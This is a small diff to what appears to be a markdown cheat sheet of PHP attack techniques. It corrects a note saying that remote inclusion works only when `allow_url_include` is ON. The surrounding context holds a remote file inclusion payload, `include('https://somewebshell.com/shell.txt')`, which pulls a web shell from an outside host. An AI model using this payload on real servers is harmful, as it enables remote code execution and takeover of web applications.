@@ -82,4 +82,4 @@ d. `<script language="php"> echo 'sample'; </script>` - PHP < 7.0.0
 
 	<?php include('https://somewebshell.com/shell.txt');?>
     
-> This will work only if `allow_url_include` is not in the `DISABLE_FUNCTIONS` in phpinfo.
+> This will work only if `allow_url_include` is ON in phpinfo.
